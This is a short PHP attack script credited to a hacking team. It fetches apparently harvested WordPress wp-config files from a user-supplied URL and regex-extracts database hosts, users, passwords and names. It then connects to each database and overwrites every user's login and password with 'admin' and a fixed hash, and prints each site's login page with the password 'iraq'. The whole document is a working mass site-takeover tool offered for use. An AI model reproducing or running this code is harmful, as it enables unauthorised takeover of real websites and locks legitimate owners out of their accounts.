FAROUK GENERAL @COPYRIGHT -CHITANEDZ #DRS #DZ #TEAM <br><br>
<form method="post">
<input type="text" name="config" placeholder="URL">
<input type="submit" name="ch" value="Change">
</form>
<?
set_time_limit(0);
error_reporting(0);
if($_POST['ch']){
$get2 = file_get_contents($_POST['config']);
preg_match_all('#<a href="(.*?)"#', $get2, $config);
foreach($config[1] as $don){
$get = file_get_contents($_POST['config']."/".$don);

preg_match_all("#'DB_HOST', '(.*?)'#", $get, $host);
foreach($host[1] as $don){
	$host = $don;
}
###
preg_match_all("#'DB_PASSWORD', '(.*?)'#", $get, $pass);
foreach($pass[1] as $done){
	$password = $done;
}
###
preg_match_all("#'DB_USER', '(.*?)'#", $get, $user);
foreach($user[1] as $done1){
	$user = $done1;
}
###
preg_match_all("#'DB_NAME', '(.*?)'#", $get, $name);
foreach($name[1] as $done2){
	$name = $done2;
}
###
preg_match_all("#$table_prefix  = '(.*?)'#", $get, $prefix);
foreach($prefix[1] as $done3){
	$prefix = $done3;
}
$connect = mysqli_connect($host,$user,$password,$name);
if($connect){
	$query1 = mysqli_query($connect,"select * from ".$prefix."options where option_name='siteurl'");
while($siteurl = mysqli_fetch_array($query1)){
	$site_url = $siteurl['option_value'];
}
#####
$query2 = mysqli_query($connect,"update ".$prefix."users set user_login='admin',user_pass='d3b1cee2327cfa357dabf0289958c024'");
if($query2){
	echo "URL : <a href='$site_url/wp-login.php' target='_blank'>$site_url</a><br><br>UserName : admin<br><br>Password : iraq<br><br>";
}
}
}
}
?>
